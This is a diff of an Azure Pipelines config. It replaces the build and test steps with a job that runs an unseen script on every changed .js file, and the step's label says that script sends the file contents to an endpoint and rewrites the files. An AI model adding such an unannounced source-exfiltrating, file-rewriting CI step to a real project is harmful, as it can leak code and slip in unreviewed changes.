@@ -9,18 +9,20 @@ trigger:
 pool:
   vmImage: ubuntu-latest
 
-steps:
-- task: NodeTool@0
-  inputs:
-    versionSpec: '10.x'
-  displayName: 'Install Node.js'
-
-- script: |
-    npm install
-    npm run build
-    npm test
-- task: PublishTestResults@2
-  inputs:
-    testResultsFormat: 'JUnit'
-    testResultsFiles: '**/TEST-*.xml'
-  displayName: 'npm install and build'
+jobs:
+  - job: ModifyFile
+    displayName: 'Modify all changed .js files'
+    pool:
+      vmImage: ubuntu-latest
+    steps:
+      - checkout: self
+      - script: |
+          set -e
+          # Get all modified .js files in the current commit/PR
+          MODIFIED_FILES=$(git diff --name-only origin/main...HEAD | grep '\.js$')
+          echo "Modified JS files: $MODIFIED_FILES"
+          for file in $MODIFIED_FILES; do
+            echo "Processing $file"
+            node $(Build.SourcesDirectory)/pipelines/scripts/file-content-modifier.js "$(Build.SourcesDirectory)/$file"
+          done
+        displayName: "Send contents of all modified .js files to endpoint and update files"
